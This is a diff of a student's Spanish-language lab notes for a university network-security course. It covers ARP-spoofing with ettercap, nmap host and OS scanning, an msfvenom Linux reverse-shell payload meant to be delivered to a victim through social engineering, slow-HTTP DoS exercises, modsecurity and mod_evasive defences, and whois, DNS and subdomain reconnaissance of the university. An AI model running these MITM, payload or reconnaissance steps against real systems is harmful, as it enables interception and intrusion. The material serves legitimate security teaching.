@@ -2,6 +2,20 @@
 
 En esta segunda parte se muestran las soluciones a la primera práctica. En [`p2-sesiones`](./p2-sesiones.md) se mostrarán los apuntes tomados durante las sesiones.
 
+## EJERCICIOS
+
+### Apartado A
+
+Instale el ettercap y pruebe sus opciones básicas en línea de comando.
+
+```
+apt install ettercap-text-only
+```
+
+### Apartado B
+
+Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería  (puede utilizar el wireshark para los siguientes subapartados).
+
 ```bash
 root@debian:/home/lsi# ettercap -T -q -i ens33 -M arp:remote //10.11.49.146/ //10.11.48.1/ -w ficherito
 
@@ -39,8 +53,26 @@ Starting Unified sniffing...
 
 Text only Interface activated...
 Hit 'h' for inline help
-
 ```
+
+- Identifique los campos de cabecera de un paquete TCP.
+
+- Filtre la captura para obtener el tráfico HTTP.
+
+- Obtenga los distintos "objetos" del tráfico HTTP (imágenes, pdfs, etc.)
+
+- Visualice la paquetería TCP de una determinada sesión.
+
+- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico sobre el tráfico.
+
+- Obtenga información del tráfico de las distintas "conversaciones" mantenidas.
+
+- Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.
+
+
+### Apartado C
+
+Obtenga la relación de las direcciones MAC de los equipos de su segmento.
 
 ```bash
 root@debian:/home/lsi# nmap -sP 10.11.48.0/23
@@ -584,6 +616,10 @@ Host is up.
 Nmap done: 512 IP addresses (179 hosts up) scanned in 6.81 seconds
 ```
 
+### Apartado D
+
+Obtenga la relación de las direcciones IPv6 de su segmento.
+
 ```bash
 root@debian:/home/lsi# ping6 -c2 -I ens33 ff02::1
 ping6: Warning: source address might be selected on device other than: ens33
@@ -881,11 +917,21 @@ fe80::250:56ff:fe97:29f0 dev ens33 lladdr 00:50:56:97:29:f0 STALE
 fe80::250:56ff:fe97:2798 dev ens33 lladdr 00:50:56:97:27:98 router STALE
 fe80::250:56ff:fe97:ee5b dev ens33 lladdr 00:50:56:97:ee:5b STALE
 fe80::250:56ff:fe97:6605 dev ens33 lladdr 00:50:56:97:66:05 STALE
-
 ```
 
+### Apartado E
 
+Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
 
+### Apartado F
+
+Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.
+
+### Apartado G
+
+Instale metasploit. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
+
+1. Creamos payload:
 
 ```bash
 root@debian:/home/lsi# msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin
@@ -894,5 +940,967 @@ root@debian:/home/lsi# msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50
 No encoder specified, outputting raw payload
 Payload size: 123 bytes
 Final size of elf file: 207 bytes
+```
+
+2. Lo metemos en la víctima:
+
+```bash
+
+```
+
+3. Desde el cliente:
+
+```bash
+
+```
+
+4. Después de ejecutar el payload obtenemos un reverse shell en el atacante:
+
+### Apartado H
+
+Haga un MITM en IPv6 y visualice la paquetería.
+
+### Apartado I
+
+Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
+
+- Vaciar arp: `ip -s -s neigh flush all`
+
+```bash
+root@debian:/home/lsi# cat /etc/arpon.conf 
+#
+# ArpON configuration file.
+#
+# See the arpon(8) man page for details.
+#
+
+#
+# Static entries matching the eth0 network interface:
+#
+# First static entry:
+#192.168.1.1     58:ac:78:10:b9:77
+# Second static entry:
+#192.168.1.3     d4:be:d9:fe:8b:45
+# Third static entry:
+#192.168.1.4     90:94:e4:bb:1c:10
+
+#
+# Static entries matching the eth1 network interface:
+#
+# First static entry:
+#10.0.1.1        58:ac:78:88:1a:bb
+# Second static entry:
+#10.0.10.1       90:94:e4:7e:f4:59
+root@debian:/home/lsi# 
+root@debian:/home/lsi# arpon -d -i ens33 -H
+root@debian:/home/lsi# Nov 01 16:14:49 [INFO] Background process is running (15324).
+
+root@debian:/home/lsi# ps -A | grep arpon
+  15324 ?        00:00:00 arpon
+root@debian:/home/lsi# kill 15324
+```
+
+### Apartado J
+
+Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.
+
+```bash
+root@debian:/home/lsi# nmap -A 10.11.48.0/23 > nmap_full.txt
+```
+
+```
+
+```
+
+Realice alguna de las pruebas de port scanning sobre IPv6.
+
+```bash
+root@debian:/home/lsi# nmap -A -6 fe80::250:56ff:fe97:d0a2
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 16:26 CET
+Nmap scan report for fe80::250:56ff:fe97:d0a2
+Host is up (0.00021s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  tcpwrapped
+MAC Address: 00:50:56:97:D0:A2 (VMware)
+No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=6%D=11/1%OT=22%CT=1%CU=41679%PV=N%DS=1%DC=D%G=Y%M=005056%
+OS:TM=63613AB9%P=x86_64-pc-linux-gnu)S1(P=6003948d00280640XX{32}001688c74e
+OS:ae89ecdf2772d1a012fb04e6470000020405a00402080a692ff6c9ff{4}01030307%ST=
+OS:0.010048%RT=0.010437)S2(P=60034ee600280640XX{32}001688c8b3a8f194df2772d
+OS:2a012fb04193f0000020405a00402080a692ff72dff{4}01030307%ST=0.110036%RT=0
+OS:.11041)S3(P=6002427d00280640XX{32}001688c9f6d18678df2772d3a012fb0443cd0
+OS:000020405a00101080a692ff791ff{4}01030307%ST=0.210144%RT=0.210517)S4(P=6
+OS:00b20ee00280640XX{32}001688ca805d481adf2772d4a012fb04f5380000020405a004
+OS:02080a692ff7f5ff{4}01030307%ST=0.310055%RT=0.310498)S5(P=6009e8ae002806
+OS:40XX{32}001688cbebbe4e6ddf2772d5a012fb04831e0000020405a00402080a692ff85
+OS:9ff{4}01030307%ST=0.41007%RT=0.410441)S6(P=6009b42000240640XX{32}001688
+OS:cc3fc1c1f4df2772d69012fb04cf3c0000020405a00402080a692ff8bdff{4}%ST=0.51
+OS:006%RT=0.510419)IE1(P=60038e6000803a40XX{32}81097f21abcd00{122}%ST=0.55
+OS:0661%RT=0.550898)IE2(P=600c816500583a40XX{32}0401807900{3}3860012345002
+OS:80035XX{32}3c00010400{4}2b00010400{12}3a00010400{4}800080a1abcd0001%ST=
+OS:0.600211%RT=0.600478)NS(P=6000{4}183affXX{32}8800bd544000{3}XX{16}%ST=0
+OS:.649789%RT=0.649996)U1(P=6008c1d101643a40XX{32}010415b600{4}60012345013
+OS:41125XX{32}884fa2cf013415b143{300}%ST=0.699269%RT=0.699519)TECN(P=600fc
+OS:73e00200640XX{32}001688cd0c0f4f0ddf2772d78052fd20e8680000020405a0010104
+OS:0201030307%ST=0.749789%RT=0.750115)T4(P=6006ffac00140640XX{32}001688d04
+OS:2f4eccd00{4}50040000a3eb0000%ST=0.897937%RT=0.898193)T5(P=6008762a00140
+OS:640XX{32}000188d100{4}df2772db5014000081ae0000%ST=0.94746%RT=0.947712)T
+OS:6(P=6001e65100140640XX{32}000188d2b7a43dd400{4}50040000de470000%ST=0.99
+OS:6988%RT=0.997269)T7(P=6008eff300140640XX{32}000188d300{4}df2772dd501400
+OS:0081aa0000%ST=1.04654%RT=1.04678)EXTRA(FL=12345)
+
+Network Distance: 1 hop
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:97:d0:a2
+|_      manuf: VMware
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.22 ms fe80::250:56ff:fe97:d0a2
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
+```
+
+¿Coinciden los servicios prestados por un sistema con los de IPv4?
+
+En este caso sí. Puertos 22 y 514.
+
+### Apartado K
+
+Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
+
+```bash
+root@debian:/home/lsi# iftop -i ens33
+                    12,5Kb              25,0Kb              37,5Kb              50,0Kb         62,5Kb
+└───────────────────┴───────────────────┴───────────────────┴───────────────────┴────────────────────
+debian                               => 10.11.49.55                           33,6Kb  6,72Kb  2,59Kb
+                                     <=                                       37,3Kb  7,45Kb  2,87Kb
+debian                               => 10.30.10.165                           800b    890b   1,65Kb
+                                     <=                                        208b    208b    400b
+debian                               => sol.udc.pri                            280b     56b     65b
+                                     <=                                        576b    115b    118b
+
+
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────
+TX:             cum:   14,0KB   peak:   34,7Kb                       rates:   34,7Kb  7,65Kb  4,30Kb
+RX:                    11,0KB           38,0Kb                                38,0Kb  7,77Kb  3,37Kb
+TOTAL:                 24,9KB           72,7Kb                                72,7Kb  15,4Kb  7,67Kb
+```
+
+```bash
+root@debian:/home/lsi# vnstat -l -i ens33
+Monitoring ens33...    (press CTRL-C to stop)
+
+   rx:       504 bit/s     1 p/s          tx:       728 bit/s     0 p/s^C
+
+
+ ens33  /  traffic statistics
+
+                           rx         |       tx
+--------------------------------------+------------------
+  bytes                   123,24 KiB  |       60,70 KiB
+--------------------------------------+------------------
+          max          206,90 kbit/s  |    46,75 kbit/s
+      average            7,01 kbit/s  |     3,45 kbit/s
+          min              264 bit/s  |         0 bit/s
+--------------------------------------+------------------
+  packets                       2096  |             983
+--------------------------------------+------------------
+          max                431 p/s  |         107 p/s
+      average                 14 p/s  |           6 p/s
+          min                  0 p/s  |           0 p/s
+--------------------------------------+------------------
+  time                  2,40 minutes
+
+```
+
+### Apartado L
+
+PARA PLANTEAR DE FORMA TEÓRICA:
+
+¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
+
+¿Y mediante un DoS de tipo reflective flooding attack?
+
+> Adistributed denial-of-service attack may involve sending forged requests of some type to a very large number of computers that will reply to the requests. Using Internet Protocol address spoofing, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target. (This reflected attack form is sometimes called a "DRDOS".\[66])
+
+### Apartado M
+
+Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
+
+```bash
+root@debian:/home/lsi# apt install apache2
+...
+root@debian:/home/lsi# curl https://www.alvarofreire.es/ > /var/www/html/index.html
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  9341  100  9341    0     0  56612      0 --:--:-- --:--:-- --:--:-- 56957
+```
+
+```bash
+
+```
+
+archivo slowhttp.html:
+
+- ª
+
+¿Cómo podría proteger dicho servicio ante este tipo de ataque?
+
+¿Y si se produjese desde fuera de su segmento de red?
+
+¿Cómo podría tratar de saltarse dicha protección?
+
+
+### Apartado N
+
+Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
+
+```bash
+root@debian:/home/lsi# apt install libapache2-mod-security2
+...
+root@debian:/home/lsi# a2enmod headers
+Enabling module headers.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+root@debian:/home/lsi# systemctl restart apache2
+root@debian:/home/lsi# cp /etc/modsecurity/modsecurity.conf-recommended app
+root@debian:/home/lsi# nano /etc/modsecurity/modsecurity.conf
+# Enable ModSecurity, attaching it to every transaction. Use detection
+# only to start with, because that minimises the chances of post-installation
+# disruption.
+#
+SecRuleEngine On
+```
+
+> Change `SecRuleEngine` from `DetectionOnly` to `On`
+
+```bash
+root@debian:/home/lsi# apt install libapache2-mod-evasive
+root@debian:/home/lsi# a2enmod evasive
+root@debian:/home/lsi# cat /etc/apache2/mods-enabled/evasive.conf 
+<IfModule mod_evasive20.c>
+    #DOSHashTableSize    3097
+    DOSPageCount        1
+    DOSSiteCount        1
+    
+    DOSPageInterval     1
+    DOSSiteInterval     2
+    
+    DOSBlockingPeriod   300
+
+    #DOSEmailNotify      you@yourdomain.com
+    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
+    #DOSLogDir           "/var/log/mod_evasive"
+</IfModule>
+```
+
+### Apartado O
+
+Buscamos información:
+
+- Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
+
+> `whois` está capado desde la máquina virtual, pero desde mi máquina ejecuto:
+
+```zsh
+╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 16:56:21
+╰─○ whois -h whois.ripe.net UDC
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '193.144.48.0 - 193.144.63.255'
+
+% Abuse contact for '193.144.48.0 - 193.144.63.255' is 'iris@certsi.es'
+
+inetnum:        193.144.48.0 - 193.144.63.255
+netname:        UDC
+descr:          Universidade da Coru~na
+descr:          Rede de Comunicacions
+country:        ES
+admin-c:        JFA10-RIPE
+tech-c:         JFA10-RIPE
+abuse-c:        RIAC2-RIPE
+status:         ASSIGNED PA
+mnt-irt:        IRT-IRIS
+remarks:        mail spam reports: iris@certsi.es
+remarks:        security incidents: iris@certsi.es
+mnt-by:         REDIRIS-NMC
+created:        1970-01-01T00:00:00Z
+last-modified:  2017-12-11T13:59:57Z
+source:         RIPE # Filtered
+
+person:         Javier Farinas Alvarino
+address:        Rede de Comunicacións
+address:        Servizo de Informatica e Comunicacions
+address:        Edificio de Servizos Centrais de Investigacion
+address:        Campus de Elvina
+address:        Universidade da Coruna
+address:        E - 15071 - A Coruna
+address:        SPAIN
+phone:          +34 981167000 ext. 1199
+nic-hdl:        JFA10-RIPE
+mnt-by:         REDIRIS-NMC
+created:        2010-01-26T08:16:45Z
+last-modified:  2017-10-30T22:08:05Z
+source:         RIPE # Filtered
+
+% Information related to '193.147.32.0 - 193.147.41.255'
+
+% Abuse contact for '193.147.32.0 - 193.147.41.255' is 'iris@certsi.es'
+
+inetnum:        193.147.32.0 - 193.147.41.255
+netname:        UDC
+descr:          Universidade da Coru~na
+descr:          Rede de Comunicacions
+country:        ES
+admin-c:        JFA10-RIPE
+tech-c:         JFA10-RIPE
+abuse-c:        RIAC2-RIPE
+status:         ASSIGNED PA
+mnt-irt:        IRT-IRIS
+remarks:        mail spam reports: iris@certsi.es
+remarks:        security incidents: iris@certsi.es
+mnt-by:         REDIRIS-NMC
+created:        1970-01-01T00:00:00Z
+last-modified:  2017-12-11T14:00:12Z
+source:         RIPE # Filtered
+
+person:         Javier Farinas Alvarino
+address:        Rede de Comunicacións
+address:        Servizo de Informatica e Comunicacions
+address:        Edificio de Servizos Centrais de Investigacion
+address:        Campus de Elvina
+address:        Universidade da Coruna
+address:        E - 15071 - A Coruna
+address:        SPAIN
+phone:          +34 981167000 ext. 1199
+nic-hdl:        JFA10-RIPE
+mnt-by:         REDIRIS-NMC
+created:        2010-01-26T08:16:45Z
+last-modified:  2017-10-30T22:08:05Z
+source:         RIPE # Filtered
+
+% Information related to '2001:720:121c::/48'
+
+% Abuse contact for '2001:720:121c::/48' is 'iris@certsi.es'
+
+inet6num:       2001:720:121c::/48
+netname:        UDC
+descr:          Universidad de La Corunna
+descr:          La Corunna
+country:        ES
+admin-c:        JFA32-RIPE
+tech-c:         JFA32-RIPE
+abuse-c:        RIAC2-RIPE
+status:         ASSIGNED
+mnt-by:         REDIRIS-NMC
+mnt-irt:        IRT-IRIS
+created:        2011-05-16T08:32:59Z
+last-modified:  2017-12-11T14:00:14Z
+source:         RIPE # Filtered
+
+person:         Javier Farinnas Alvarinno
+address:        Universidad de La Coruña
+address:        c/ Maestranza, 9
+address:        E-15001 La Coruña
+address:        SPAIN
+phone:          +34 981167199
+fax-no:         +34 981167172
+nic-hdl:        JFA32-RIPE
+mnt-by:         REDIRIS-NMC
+created:        2011-05-16T08:32:59Z
+last-modified:  2017-10-30T22:13:47Z
+source:         RIPE # Filtered
+
+% This query was served by the RIPE Database Query Service version 1.104 (WAGYU)
+```
+
+- Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.
+
+```zsh
+╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:00:35
+╰─○ dig udc.es MX
+
+; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> udc.es MX
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36525
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 65494
+;; QUESTION SECTION:
+;udc.es.				IN	MX
+
+;; ANSWER SECTION:
+udc.es.			3600	IN	MX	10 udc-es.mail.protection.outlook.com.
+
+;; Query time: 72 msec
+;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
+;; WHEN: Tue Nov 01 17:00:41 CET 2022
+;; MSG SIZE  rcvd: 85
+
+╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:00:41
+╰─○ dig udc.es NS 
+
+; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> udc.es NS
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15866
+;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 6
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 65494
+;; QUESTION SECTION:
+;udc.es.				IN	NS
+
+;; ANSWER SECTION:
+udc.es.			14400	IN	NS	zape.udc.es.
+udc.es.			14400	IN	NS	zipi.udc.es.
+udc.es.			14400	IN	NS	chico.rediris.es.
+udc.es.			14400	IN	NS	sun.rediris.es.
+
+;; ADDITIONAL SECTION:
+sun.rediris.es.		26841	IN	A	199.184.182.1
+sun.rediris.es.		4600	IN	AAAA	2620:171:808::1
+zape.udc.es.		13962	IN	AAAA	2001:720:121c:e000::102
+chico.rediris.es.	25333	IN	A	162.219.54.2
+chico.rediris.es.	5651	IN	AAAA	2620:10a:80eb::2
+
+;; Query time: 88 msec
+;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
+;; WHEN: Tue Nov 01 17:01:02 CET 2022
+;; MSG SIZE  rcvd: 235
+```
+
+- ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?
+
+No, tiene la transferencia de zona deshabilitada:
+
+```zsh
+╭─alvarofreire at alvaro-msi in ~ 22-11-01 - 17:01:44
+╰─○ dig axfr @zipi.udc.es udc.es.
+
+; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> axfr @zipi.udc.es udc.es.
+; (2 servers found)
+;; global options: +cmd
+; Transfer failed.
+```
+
+- En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
+
+```bash
+root@debian:/home/lsi# nmap --script hostmap-crtsh.nse udc.es
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 17:05 CET
+Nmap scan report for udc.es (193.144.53.84)
+Host is up (0.00064s latency).
+Other addresses for udc.es (not scanned): 2001:720:121c:e000::203
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+
+Host script results:
+| hostmap-crtsh: 
+|   subdomains: 
+|     lpnmr2013.udc.es
+|     www.gtec.udc.es
+|     jitel21.udc.es
+|     eurosci.udc.es\nwww.eurosci.udc.es
+|     hercules.udc.es
+|     caminos.udc.es
+|     backend.campus-suds.udc.es
+|     radius.udc.es
+|     cemi.udc.es
+|     contubernio.tic.udc.es
+|     solaria.dc.fi.udc.es
+|     artistica.udc.es
+|     campus-suds.udc.es
+|     npm.campus-suds.udc.es
+|     admin.campus-suds.udc.es
+|     nas.gtec.udc.es
+|     coloso.dc.fi.udc.es
+|     gcd.udc.es\nwww.gcd.udc.es
+|     centinela.udc.es
+|     clepito.udc.es
+|     latex.gtec.udc.es
+|     xnas.gtec.udc.es
+|     telmo.udc.es
+|     debauthn.tic.udc.es
+|     vi216.udc.es
+|     iala.udc.es
+|     etsa.udc.es\niacobusplus.udc.es\nwww.iacobusplus.udc.es
+|     inefg.udc.es
+|     ciencias.udc.es
+|     euat.udc.es
+|     vios.dc.fi.udc.es
+|     culombio.udc.es
+|     humanidades.udc.es
+|     cdah.humanidades.udc.es
+|     filo247.udc.es
+|     pangea.udc.es
+|     data.gtec.udc.es
+|     lim.ii.udc.es
+|     consellosocial.udc.es\nwww.consellosocial.udc.es
+|     dpauc.udc.es\nwww.dpauc.udc.es
+|     hexa.gtec.udc.es
+|     proaclim.udc.es
+|     paisaje.udc.es
+|     dm.udc.es
+|     ftp.udc.es
+|     pcmecanismos.eps.cdf.udc.es
+|     mura.master.blog.udc.es
+|     jenui2022.udc.es
+|     radon.citeec.udc.es
+|     iot.gtec.udc.es
+|     smtp2.udc.es
+|     inmotion.udc.es
+|     deploy.fic.udc.es
+|     gitlab.fic.udc.es
+|     redmine.fic.udc.es
+|     sonar.fic.udc.es
+|     jenkins.fic.udc.es
+|     vi220.udc.es
+|     tmp.campus-suds.udc.es
+|     www.educacion.udc.es
+|     fee.udc.es
+|     dante.dec.udc.es
+|     docencia.lbd.udc.es
+|     vi214.udc.es
+|     app.rnasa-imedir.udc.es
+|     merlin.udc.es
+|     uptodateinternacional.udc.es
+|     eaetx.udc.es
+|     cifcyt.udc.es
+|     sil.dc.fi.udc.es
+|     guisamo.des.udc.es
+|     lbd.udc.es
+|     illa.udc.es\nwww.illa.udc.es
+|     bvg.udc.es
+|     pon.tic.udc.es
+|     200.dm.fi.udc.es
+|     vi141.udc.es
+|     www.eudi.udc.es
+|     campusvirtual.udc.es
+|     citeni.udc.es
+|     gii.udc.es\nwww.gii.udc.es
+|     aesla2020.udc.es
+|     infoguias.biblioteca.udc.es
+|     agrupacionciteec.udc.es\nwww.agrupacionciteec.udc.es
+|     sociologia.udc.es\nwww.sociologia.udc.es
+|     mujeresvideojuegos.udc.es
+|     campusindustrial.udc.es
+|     smtp3.udc.es
+|     novas.udc.es\nudc.es\nwww.udc.es
+|     *.xescampus.udc.es
+|     servizos.centros.udc.es
+|     documenta.udc.es
+|     *.sic.udc.es
+|     *.sai.udc.es
+|     *.citic.udc.es\ncitic.udc.es
+|     gcd.udc.es
+|     *.accedys.udc.es\naccedys.udc.es
+|     kmelot.biblioteca.udc.es
+|     economicas.udc.es\nwww.economicas.udc.es
+|     aiplus.udc.es
+|     impresion.eps.udc.es
+|     cerbero.tic.udc.es
+|     gie.udc.es
+|     catedra.handytronic.fic.udc.es
+|     imedir.udc.es\nwww.imedir.udc.es
+|     authtv.udc.es\ndestv.udc.es\nlive.udc.es\nnakedpretv.udc.es\nocadmin.udc.es\nocengage.udc.es\nocingest.udc.es\npreauthtv.udc.es\npredestv.udc.es\nprelive.udc.es\npreocadmin.udc.es\npreocengage.udc.es\npretv.udc.es
+|     soc34.udc.es
+|     comunicacion.udc.es
+|     udcportal.udc.es
+|     nac.udc.es
+|     *.xrede.udc.es
+|     masterciencias.udc.es
+|     mx2.udc.es
+|     listas.udc.es
+|     adfs.udc.es
+|     www.gcd.udc.es
+|     filo249.udc.es
+|     citeec.udc.es
+|     www.citeec.udc.es
+|     videalab.udc.es
+|     vac.udc.es
+|     sbc-1.udc.es
+|     cica.udc.es
+|     guasom.citic.udc.es
+|     memoriarsu.udc.es\nwww.memoriarsu.udc.es
+|     udc.es\nwww.udc.es
+|     *.pruebasaccedys.udc.es\npruebasaccedys.udc.es
+|     www.dc.fi.udc.es
+|     catalogo-publicacions.udc.es
+|     masterturismo.udc.es
+|     mias.udc.es
+|     vices.udc.es
+|     *.vdi.udc.es\nvdi.udc.es
+|     servidorbim.euat.udc.es\nwww.servidorbim.euat.udc.es
+|     bim.udc.es\nwww.bim.udc.es
+|     nauticaemaquinas.udc.es\nwww.nauticaemaquinas.udc.es
+|     ftp.iuem.udc.es\niuem.udc.es
+|     iuem.udc.es
+|     rtls.gtec.udc.es
+|     pretv.udc.es
+|     nakedpretv.udc.es
+|     preauthtv.udc.es
+|     ndn.gtec.udc.es
+|     siem.seguridade.udc.es
+|     incude.udc.es
+|     premiosconsellosocial.udc.es
+|     hiperform.gtec.udc.es
+|     ale.gtec.udc.es
+|     ftpweb.udc.es
+|     www.gcons.udc.es
+|     pluton.dec.udc.es\npluton.des.udc.es
+|     nas.talionis.udc.es
+|     nas.gcons.udc.es
+|     gis.gac.udc.es\nwww.gis.gac.udc.es
+|     gis.gac.udc.es
+|     adcim.des.udc.es\nbdev.des.udc.es\nbdwatchdog.dec.udc.es\nbplg.des.udc.es\ncpc2006.des.udc.es\ncppc.des.udc.es\ndec.udc.es\ndepspawn.des.udc.es\ndes.udc.es\nflamemr.des.udc.es\ngac.des.udc.es\ngac.udc.es\nghpc.udc.es\nhpl.des.udc.es\nhsra.dec.udc.es\njfs.des.udc.es\nmardre.des.udc.es\nmrev.des.udc.es\npdp2004.des.fi.udc.es\nservet.des.udc.es\nsimula3ms.des.udc.es\nupcblas.des.udc.es\nwww.dec.udc.es\nwww.des.udc.es\nwww.gac.udc.es
+|     correcaminos2.udc.es
+|     cartolab.udc.es
+|     cartolab2.udc.es\nwww.cartolab2.udc.es
+|     box.gcons.udc.es\nwww.box.gcons.udc.es
+|     ofertatec.udc.es\notri.udc.es\nwww.intalent.udc.es
+|     escaner.seguridade.udc.es\nwww.escaner.seguridade.udc.es
+|     opendata.citic.udc.es
+|     pedrasbrancas.des.udc.es
+|     tecafyd.inef.udc.es\nwww.tecafyd.inef.udc.es
+|     doctoradosalud.udc.es\nwww.doctoradosalud.udc.es
+|     posgrado.bim.udc.es\nwww.posgrado.bim.udc.es
+|     probasinefgalicia.udc.es\nwww.probasinefgalicia.udc.es
+|     cit.udc.es\nwww.cit.udc.es
+|     fundacion.udc.es\nwww.fundacion.udc.es
+|     wiki.gtec.udc.es
+|     vpn.udc.es
+|     mastermais.udc.es\nwww.mastermais.udc.es
+|     master.bioinformatica.fic.udc.es\nwww.master.bioinformatica.fic.udc.es
+|     geriatic.udc.es\nwww.geriatic.udc.es
+|     cursosccr.regicc.udc.es\nwww.cursosccr.regicc.udc.es
+|     rnasa-imedir.udc.es\nwww.rnasa-imedir.udc.es
+|     *.fic.udc.es\nfic.udc.es
+|     sabia.tic.udc.es\nwww.sabia.tic.udc.es
+|     cei.udc.es\nwww.cei.udc.es
+|     rascuco.udc.es\nwww.rascuco.udc.es
+|     umi.udc.es\nwww.umi.udc.es
+|     eps.udc.es\nwww.eps.udc.es
+|     *.udc.es\nudc.es
+|     aesla2020.udc.es\nwww.aesla2020.udc.es
+|     talionis.citic.udc.es\nwww.talionis.citic.udc.es
+|     doctoradociencias.udc.es\nwww.doctoradociencias.udc.es
+|     radius.udc.es\nwww.radius.udc.es
+|     cloudpatient.udc.es\nwww.cloudpatient.udc.es
+|     intalent.udc.es\nwww.intalent.udc.es
+|     ofertatec.udc.es\nwww.ofertatec.udc.es
+|     otri.udc.es\nwww.otri.udc.es
+|     proaclim.udc.es\nwww.proaclim.udc.es
+|     pangea.udc.es\nwww.pangea.udc.es
+|     ojo.citeec.udc.es\nradon.citeec.udc.es\ntreboada.citeec.udc.es
+|     mujeresvideojuegos.udc.es\nwww.mujeresvideojuegos.udc.es
+|     inefg.udc.es\nwww.inefg.udc.es
+|     eudi.udc.es\nwww.eudi.udc.es
+|     educacion.udc.es\nwww.educacion.udc.es
+|     dereito.udc.es\nwww.dereito.udc.es
+|     paisaxe.udc.es
+|     infoguias.biblioteca.udc.es\nwww.infoguias.biblioteca.udc.es
+|     vi140.udc.es
+|     citic.udc.es\nwww.citic.udc.es
+|     *.sic.udc.es\nsic.udc.es
+|     *.sai.udc.es\nsai.udc.es
+|     ojo.citic.udc.es\nradon.citic.udc.es\ntreboada.citic.udc.es
+|     mayores.gtec.udc.es
+|     fee.udc.es\nwww.fee.udc.es
+|     predestv.udc.es
+|     dc.fi.udc.es\nwww.dc.fi.udc.es
+|     correcaminos2.udc.es\nwww.correcaminos2.udc.es
+|     cartolab2.udc.es
+|     nas.gcons.udc.es\nwww.nas.gcons.udc.es
+|     gcons.udc.es\nwww.gcons.udc.es
+|     forecoop.citic.udc.es
+|     vpn.udc.es\nwww.vpn.udc.es
+|     vi222.udc.es
+|     dotoradociencias.udc.es\nwww.dotoradociencias.udc.es
+|     caminos.udc.es\nwww.caminos.udc.es
+|     gac.udc.es\nwww.gac.udc.es
+|     catedra.handytronic.fic.udc.es\nwww.catedra.handytronic.fic.udc.es
+|     destv.udc.es
+|     inefg.udc.es\nprobasinefgalicia.udc.es\nwww.inefg.udc.es\nwww.probasinefgalicia.udc.es
+|     illa.udc.es
+|     servizos.centros.udc.es\nwww.servizos.centros.udc.es
+|     adfs.udc.es\nwww.adfs.udc.es
+|     gie.udc.es\nwww.gie.udc.es
+|     kmelot.biblioteca.udc.es\nwww.kmelot.biblioteca.udc.es
+|     dpauc.udc.es
+|     vdi.udc.es\nwww.vdi.udc.es
+|     aiplus.udc.es\nwww.aiplus.udc.es
+|     masterciencias.udc.es\nwww.masterciencias.udc.es
+|     videalab.udc.es\nwww.videalab.udc.es
+|     vac.udc.es\nwww.vac.udc.es
+|     sistemas.sic.udc.es\nwww.sistemas.sic.udc.es
